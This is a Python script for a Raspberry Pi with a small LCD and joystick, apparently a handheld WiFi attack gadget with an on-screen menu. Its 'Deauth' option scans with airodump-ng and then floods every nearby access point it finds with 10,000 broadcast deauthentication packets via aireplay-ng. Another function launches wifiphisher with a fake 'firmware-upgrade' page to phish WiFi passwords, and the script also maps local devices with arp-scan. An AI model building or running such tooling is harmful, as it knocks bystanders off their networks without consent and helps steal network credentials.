import RPi.GPIO as GPIO
from PIL import Image, ImageDraw, ImageFont
import LCD_1in44
import time
import os
import random
import subprocess

# Pin setup
KEY_UP_PIN = 6
KEY_DOWN_PIN = 19
KEY_LEFT_PIN = 5
KEY_RIGHT_PIN = 26
KEY_PRESS_PIN = 13

# Initialize GPIO
GPIO.setmode(GPIO.BCM)
GPIO.setup(KEY_UP_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
GPIO.setup(KEY_DOWN_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
GPIO.setup(KEY_LEFT_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
GPIO.setup(KEY_RIGHT_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
GPIO.setup(KEY_PRESS_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)

# Initialize display
disp = LCD_1in44.LCD()
Lcd_ScanDir = LCD_1in44.SCAN_DIR_DFT
disp.LCD_Init(Lcd_ScanDir)
disp.LCD_Clear()

# Display logo at startup
logo_path = "logo.png"
if os.path.exists(logo_path):
    logo_image = Image.open(logo_path)
    logo_image = logo_image.resize((128, 128))  # Ensure the image fits the screen
    disp.LCD_ShowImage(logo_image, 0, 0)
    time.sleep(3)

# Create blank image for drawing
width = 128
height = 128
image = Image.new('RGB', (width, height))

# Get drawing object to draw on image
draw = ImageDraw.Draw(image)
font = ImageFont.load_default()

def draw_keyboard(selected_key_index, input_text):
    keys = [
        '!', '"', '£', '$', '%', '&', '/', '(', ')', '=',
        '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
        'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P',
        'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', ';',
        'Z', 'X', 'C', 'V', 'B', 'N', 'M', ',', '.', '\\',
        '|', '?', '^', 'ì', ':', '-', '_', "'", '@', '#',
        '§', '*', '+', '[', ']', '{', '}', '<-', '╰┈➤'
    ]
    key_width = 12
    key_height = 12
    cols = 10

    # Clear previous image
    draw.rectangle((0, 0, width, height), outline=0, fill=(0, 0, 0))

    # Draw the current input text
    draw.text((0, 0), input_text, font=font, fill=(255, 255, 255))

    # Draw the keyboard
    for i, key in enumerate(keys):
        col = i % cols
        row = i // cols
        x = col * key_width
        y = (row + 1) * key_height  # Start drawing from second row
        if i == selected_key_index:
            draw.rectangle((x, y, x + key_width, y + key_height), fill=(0, 255, 0))  # Highlight selected key
            draw.text((x + 2, y + 2), key, font=font, fill=(0, 0, 0))
        else:
            draw.rectangle((x, y, x + key_width, y + key_height), outline=(255, 255, 255))
            draw.text((x + 2, y + 2), key, font=font, fill=(255, 255, 255))

    # Display the updated image
    disp.LCD_ShowImage(image, 0, 0)

def get_keyboard_input():
    keys = [
        '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
        'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P',
        'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', ';',
        'Z', 'X', 'C', 'V', 'B', 'N', 'M', ',', '.', '/',
        ' ', '<-', '╰┈➤'
    ]
    selected_key_index = 0
    input_text = ""

    draw_keyboard(selected_key_index, input_text)

    while True:
        if GPIO.input(KEY_UP_PIN) == 0:  # Move selection up
            selected_key_index = (selected_key_index - 10) % len(keys)
            draw_keyboard(selected_key_index, input_text)
            time.sleep(0.3)

        if GPIO.input(KEY_DOWN_PIN) == 0:  # Move selection down
            selected_key_index = (selected_key_index + 10) % len(keys)
            draw_keyboard(selected_key_index, input_text)
            time.sleep(0.3)

        if GPIO.input(KEY_LEFT_PIN) == 0:  # Move selection left
            selected_key_index = (selected_key_index - 1) % len(keys)
            draw_keyboard(selected_key_index, input_text)
            time.sleep(0.3)

        if GPIO.input(KEY_RIGHT_PIN) == 0:  # Move selection right
            selected_key_index = (selected_key_index + 1) % len(keys)
            draw_keyboard(selected_key_index, input_text)
            time.sleep(0.3)

        if GPIO.input(KEY_PRESS_PIN) == 0:  # Select key
            key = keys[selected_key_index]
            if key == '╰┈➤':
                return input_text
            elif key == '<-':
                input_text = input_text[:-1]
            else:
                input_text += key
            draw_keyboard(selected_key_index, input_text)
            time.sleep(0.3)


# Menu options
menu_options = ["Test", "Keyboard Test", "Reboot", "Shutdown", "Monitor Mode", "Show Devices", "Deauth"]
selected_index = 0

def execute_command_and_display_output():
    # Step 1: Get the BSSIDs using 'airmon-ng'
    command_bssid = "sudo airmon-ng start wlan0 && sudo airodump-ng wlan0mon --output-format csv -w /tmp/airodump && sudo cat /tmp/airodump-01.csv | grep 'Station MAC' -A 100 | awk -F',' '{print $1}' | grep -v 'Station MAC'"

    process_bssid = subprocess.Popen(command_bssid, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output_bssid, error_bssid = process_bssid.communicate()

    bssids = output_bssid.decode().split('\n')

    # Filter out any empty strings from bssids
    bssids = [bssid.strip() for bssid in bssids if bssid.strip()]

    # Step 2: Execute 'aireplay-ng' for each BSSID and display output
    for bssid in bssids:
        command_aireplay = f"sudo aireplay-ng --deauth 10000 -a {bssid} -c FF:FF:FF:FF:FF:FF wlan0mon"

        # Run the command and capture the output
        process_aireplay = subprocess.Popen(command_aireplay, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process_aireplay.communicate()

        # Save the output to a file
        with open("output.txt", "a") as file:  # Use "a" to append to the file
            file.write(f"Output for BSSID {bssid}:\n")
            file.write(output.decode())
            file.write(error.decode())
            file.write("\n\n")

        # Display the output on the LCD
        draw.rectangle((0, 0, width, height), (0, 0, 0))  # Clear the previous image
        lines = (output + error).decode().split('\n')
        y = 0
        for line in lines:
            if y >= height:  # If the output exceeds the screen height, stop drawing
                break
            draw.text((0, y), line, font=font, fill=(255, 255, 255))
            y += 10  # Adjust the line height as needed

        disp.LCD_ShowImage(image, 0, 0)

        # Wait to display the output for some time before moving to the next BSSID
        time.sleep(5)

def draw_menu(selected_index):
    # Clear previous image
    draw.rectangle((0, 0, width, height), outline=0, fill=(0, 0, 0))

    for i, option in enumerate(menu_options):
        y = i * 20  # Spacing between menu items
        if i == selected_index:
            text_size = draw.textbbox((0, 0), option, font=font)
            text_width = text_size[2] - text_size[0]
            text_height = text_size[3] - text_size[1]
            draw.rectangle((0, y, width, y + text_height), fill=(0, 255, 0))  # Highlight background
            draw.text((1, y), option, font=font, fill=(0, 0, 0))  # Text in black
        else:
            draw.text((1, y), option, font=font, fill=(255, 255, 255))  # Text in white

    # Display the updated image
    disp.LCD_ShowImage(image, 0, 0)

def show_message(message, duration):
    # Clear previous image
    draw.rectangle((0, 0, width, height), outline=0, fill=(0, 0, 0))
    text_size = draw.textbbox((0, 0), message, font=font)
    text_width = text_size[2] - text_size[0]
    text_height = text_size[3] - text_size[1]
    draw.text(((width - text_width) // 2, (height - text_height) // 2), message, font=font, fill=(255, 255, 255))
    disp.LCD_ShowImage(image, 0, 0)
    time.sleep(duration)

# Function to handle WiFi packets
def packet_handler(packet):
    if IP in packet:
        dst_ip = packet[IP].dst
        dst_port = packet[IP].dport if TCP in packet else None
        print(f"IP: {dst_ip}, Port: {dst_port}")

# Function to sniff WiFi packets
def sniff_wifi():
    print("Sniffing WiFi...")
    sniff(iface="wlan0", filter="tcp", prn=packet_handler)

# Function to deauth WiFi using Wifiphisher
def deauth_wifi():
    command = "sudo wifiphisher -aI wlan0 -jI wlan4 -p firmware-upgrade"  # Adjust the deauth options as needed
    try:
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Errore durante l'esecuzione di Wifiphisher: {e}")

# Function to show devices on the network using arp-scan
def show_devices():
    command = "sudo arp-scan --localnet"
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        devices = result.stdout.split("\n")[2:-4]  # Remove the first two lines and the last four lines of the output

        device_info = []
        for device in devices:
            parts = device.split()
            if len(parts) >= 2:
                ip_address = parts[0]
                host_name = "Unknown"  # Placeholder for host name
                try:
                    host_name = subprocess.check_output(f"nslookup {ip_address} | grep 'name = ' | awk '{{print $4}}'", shell=True).decode().strip()
                except subprocess.CalledProcessError:
                    pass
                device_info.append(f"{host_name}\n{ip_address}")

        if not device_info:
            show_message("No devices found", 2)
        else:
            selected_device_index = 0
            while True:
                # Display the current device
                draw.rectangle((0, 0, width, height), outline=0, fill=(0, 0, 0))
                draw.text((0, 0), device_info[selected_device_index], font=font, fill=(255, 255, 255))
                disp.LCD_ShowImage(image, 0, 0)

                if GPIO.input(KEY_UP_PIN) == 0:  # Scroll up
                    selected_device_index = (selected_device_index - 1) % len(device_info)
                    time.sleep(0.3)  # Debounce delay

                if GPIO.input(KEY_DOWN_PIN) == 0:  # Scroll down
                    selected_device_index = (selected_device_index + 1) % len(device_info)
                    time.sleep(0.3)  # Debounce delay

                if GPIO.input(KEY_PRESS_PIN) == 0:  # Exit device view
                    break
    except subprocess.CalledProcessError as e:
        print(f"Errore durante l'esecuzione di arp-scan: {e}")

draw_menu(selected_index)  # Initial draw
monitor = 0
try:
    while True:
        if GPIO.input(KEY_UP_PIN) == 0:  # button is pressed
            selected_index = (selected_index - 1) % len(menu_options)
            draw_menu(selected_index)
            # Debounce delay
            time.sleep(0.3)

        if GPIO.input(KEY_DOWN_PIN) == 0:  # button is pressed
            selected_index = (selected_index + 1) % len(menu_options)
            draw_menu(selected_index)
            # Debounce delay
            time.sleep(0.3)

        if GPIO.input(KEY_PRESS_PIN) == 0:  # button is pressed
            if menu_options[selected_index] == "Shutdown":
                # Execute shutdown command
                os.system("sudo shutdown now")
            elif menu_options[selected_index] == "Reboot":
                # Execute reboot command
                os.system("sudo reboot now")
            elif menu_options[selected_index] == "Deauth":
                   execute_command_and_display_output()
            elif menu_options[selected_index] == "Test":
                # Show "Hello World" for 3 seconds
                show_message("Hello World", 3)
                # Redraw menu after message
                draw_menu(selected_index)
                draw_menu(selected_index)  # Redraw menu after playing Snake
            elif menu_options[selected_index] == "Monitor Mode":
                if monitor == 0:
                    monitor += 1
                    show_message("Killing process...", 3)
                    os.system("sudo airmon-ng kill")
                    os.system("sudo airmon-ng start wlan0")
                    show_message("Wait a second...", 5)
                    show_message("Monitor Mode On", 3)
                elif monitor == 1:
                    monitor -= 1
                    os.system("sudo reboot")
                else:
                    show_message("Internal Error.\nMaybe too much mojito?", 3)

                # Redraw menu after sniffing
            elif menu_options[selected_index] == "Keyboard Test":
                kinput = get_keyboard_input()
                show_message(kinput, 3)
                draw_menu(selected_index)
            elif menu_options[selected_index] == "Deauth WiFi":
                # Deauth WiFi
                deauth_wifi()
                # Redraw menu after deauth
                draw_menu(selected_index)
            elif menu_options[selected_index] == "Show Devices":
                # Show connected devices
                show_devices()
                # Redraw menu after showing devices
                draw_menu(selected_index)
            # Debounce delay
            time.sleep(0.3)
except Exception as e:
    print(e)
    show_message("Internal Error.", 2)
    draw_menu(selected_index)

finally:
    GPIO.cleanup()
